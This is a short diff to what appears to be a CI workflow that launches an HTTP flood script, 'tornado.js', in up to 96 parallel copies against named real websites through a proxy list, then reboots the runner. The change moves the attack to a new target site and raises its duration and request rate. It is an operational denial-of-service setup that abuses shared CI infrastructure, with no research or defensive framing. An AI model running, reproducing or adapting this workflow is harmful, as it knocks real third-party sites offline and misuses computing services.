@@ -20,8 +20,8 @@ jobs:
           npm i hpack
           chmod +x tornado.js
           PIDS=()
-          for i in {1..64}; do
-            timeout 60 node tornado.js GET https://www.zulaoyun.com/ 60 9 90 fres.txt --full --query 3
+          for i in {1..96}; do
+            timeout 80 node tornado.js GET https://hexbear.xyz/ 80 16 90 proxies.txt --full --query 3
             PIDS+=($!)
           done
           
@@ -30,7 +30,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 60
+        run: sleep 80
         
       - name: OK !
         run: sudo reboot
